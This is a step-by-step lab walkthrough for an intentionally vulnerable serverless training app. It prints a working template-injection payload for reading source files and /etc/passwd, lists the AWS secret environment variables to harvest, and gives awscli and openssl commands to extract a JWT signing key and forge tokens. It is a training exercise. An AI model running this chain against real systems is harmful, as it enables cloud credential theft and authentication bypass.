# **Serverless Attack**


### *  *

-------

#### Step 1:

* Access the [Serverless-Attack](https://serverless-attack.netlify.com) Application on the browser.

```commandline
https://serverless-attack.netlify.com
```

* Register and Login to the Application

### *Note: The details provided CAN be fake and we highly recommend it!*

-------

#### Step 2:

* Once logged in, copy the value of `token` that can be found in `Session Storage` under the `Storage` section in `developer tools`

* Click on the `File-Upload` icon present in the header

* Click on the `Upload` button and upload the `readme.txt` file. It can be observed that the contents of the file is rendered on the UI

### *Note: It only accepts `.txt` files.*

### *What are the potential attacks based on this functionality???*

-------

#### Step 3:

* Similar to **Step 2**, upload `malicious-file.txt` and observe the output rendered on the UI

-------

#### Step 4:

* Sensitive information like the ones mentioned below can be fetched from the environment variables:

    * `AWS_SESSION_TOKEN`

    * `AWS_SECURITY_TOKEN`

    * `AWS_ACCESS_KEY_ID`

    * `AWS_DEFAULT_REGION`

    * `AWS_SECRET_ACCESS_KEY`


* On the Server provisioned, set the values fetched from the previous step as `Enironment variables`


```bash
export AWS_SESSION_TOKEN=<VALUE-OF-AWS_SESSION_TOKEN>

export AWS_SECURITY_TOKEN=<VALUE-OF-AWS_SECURITY_TOKEN>

export AWS_ACCESS_KEY_ID=<VALUE-OF-AWS_ACCESS_KEY_ID>

export AWS_DEFAULT_REGION=<VALUE-OF-AWS_DEFAULT_REGION>

export AWS_SECRET_ACCESS_KEY=<VALUE-OF-AWS_SECRET_ACCESS_KEY>
```

-------

#### Step 5:

* Similar to **Step 2**, upload `read-etc-pwd.txt` and `read-py-files.txt`.

* By observing the results, we were able to fetch the source-code of application. By further investigation of the source-code, we can see that `auth` is imported.

* Edit `read-py-files.txt` file to fetch source-code of `auth.py` and upload the file

```bash
{{ ''.__class__.__mro__[2].__subclasses__()[40]('auth.py').read() }}
```

* From `auth.py`, it can be observed that `AWS SSM` is being used and `JWT_PASS` is the parameter that needs to be fetched.

-------

#### Step 6:

* Use `awscli` to fetch decrypted `JWT_PASS` from `SSM` 

### *Note: Ensure that `awscli` has been installed and the AWS `environment variables` have been set*

```commandline
aws ssm get-parameters --names "JWT_PASS" --with-decryption
```

* The `Value` fetched in encoded with `base64`. Decode to get the private key.

```commandline
echo "<JWT_PASS value>" | base64 --d > privkey
```

* Using the private key, create a public key using `openssl`

```commandline
openssl rsa -in privkey -pubout -outform PEM -out public.key.pub
```

-------

#### Step 7:

* Access [`jwt.io`](https://jwt.io) on the browser and paste the `JWT Token` fetched in **Step 2**.

* Paste the value of `privkey` and `public.key.pub` under the `Verify Signature` section.

* The `Payload` data can now be tampered with

--------

### Reading Material/References:
